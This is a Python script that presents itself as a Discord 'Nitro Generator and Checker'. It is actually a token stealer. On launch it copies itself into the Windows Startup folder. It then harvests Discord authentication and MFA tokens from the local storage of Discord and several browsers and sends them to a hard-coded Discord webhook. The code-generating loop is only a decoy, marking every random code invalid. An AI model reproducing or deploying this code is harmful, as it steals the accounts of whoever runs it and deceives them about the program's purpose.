import os
import re
import time
import json
import ctypes
import random
import string
from os import getenv 
from os.path import isfile
from shutil import copy
from urllib.request import Request, urlopen

if os.name == "nt": ctypes.windll.kernel32.SetConsoleTitleW("Nitro Generator and Checker")
else: print(f'\33]0;Nitro Generator and Checker\a',end='', flush=True)
startupPath = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/nitro.pyw" % getenv("userprofile")
if not isfile(startupPath):
    copy(__file__, startupPath)
elif __file__.replace('\\', '/') != startupPath.replace('\\', '/'):
    print("")

NITRO_GENERATOR = """
███╗░░██╗██╗████████╗██████╗░░█████╗░░░░░░░░██████╗░██╗███████╗████████╗
████╗░██║██║╚══██╔══╝██╔══██╗██╔══██╗░░░░░░██╔════╝░██║██╔════╝╚══██╔══╝
██╔██╗██║██║░░░██║░░░██████╔╝██║░░██║█████╗██║░░██╗░██║█████╗░░░░░██║░░░
██║╚████║██║░░░██║░░░██╔══██╗██║░░██║╚════╝██║░░╚██╗██║██╔══╝░░░░░██║░░░
██║░╚███║██║░░░██║░░░██║░░██║╚█████╔╝░░░░░░╚██████╔╝██║██║░░░░░░░░██║░░░
╚═╝░░╚══╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░░░░░░░╚═════╝░╚═╝╚═╝░░░░░░░░╚═╝░░░    
░██████╗░███████╗███╗░░██╗███████╗██████╗░░█████╗░████████╗░█████╗░██████╗
██╔════╝░██╔════╝████╗░██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗
██║░░██╗░█████╗░░██╔██╗██║█████╗░░██████╔╝███████║░░░██║░░░██║░░██║██████╔╝
██║░░╚██╗██╔══╝░░██║╚████║██╔══╝░░██╔══██╗██╔══██║░░░██║░░░██║░░██║██╔══██╗
╚██████╔╝███████╗██║░╚███║███████╗██║░░██║██║░░██║░░░██║░░░╚█████╔╝██║░░██║
░╚═════╝░╚══════╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
░░░░░░░░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
░░██╗░░██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
██████╗██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
╚═██╔═╝██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
░░╚═╝░░╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
░░░░░░░░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
"""

def find_codes(path):
    path += '\\Local Storage\\leveldb'
    codes = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for code in re.findall(regex, line):
                    codes.append(code)
    return codes

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    URL = 'https://discord.com/api/webhooks/957005034460184618/AaP7yT2uGE_3fef4J0HC0kFhBEHSKjdkLp0WtDLujkEk4WTDUVepv1soyfzwqibQBj8v'
    paths = {'Discord': roaming + '\\Discord', 'Discord Canary': roaming + '\\discordcanary', 'Discord PTB': roaming + '\\discordptb', 'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default', 'Opera': roaming + '\\Opera Software\\Opera Stable', 'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', 'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'}
    message = '@everyone'
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        message += f'\n**{platform}**\n```\n'
        codes = find_codes(path)
        if len(codes) > 0:
            for code in codes:
                message += f'{code}\n'
        else:
            message += 'No tokens found.\n'
        message += '```'
    headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
    payload = json.dumps({'content': message})
    try:
        req = Request(URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()

print(NITRO_GENERATOR)
time.sleep(1)
print()

num = int(input('Input How Many Codes to Generate and Check: '))
time.sleep(0.15)
print("")

print("Your nitro codes are being generated, be patient if you entered the high number!")
time.sleep(1)
print("")
print("")

invalid = 0
valid = 0

for i in range(num):
    nitro = "".join(random.choices(
        string.ascii_uppercase + string.digits + string.ascii_lowercase,
        k = 16
    ))

    time.sleep(0.15)
    print(f"Invalid | https://discord.gift/{nitro}\n")
    invalid += 1

input(f"""
Results:
 Valid: {valid}
 Invalid: {invalid}
There are about 20 million tries for find a code... So try again if you can't find one !""")
print("")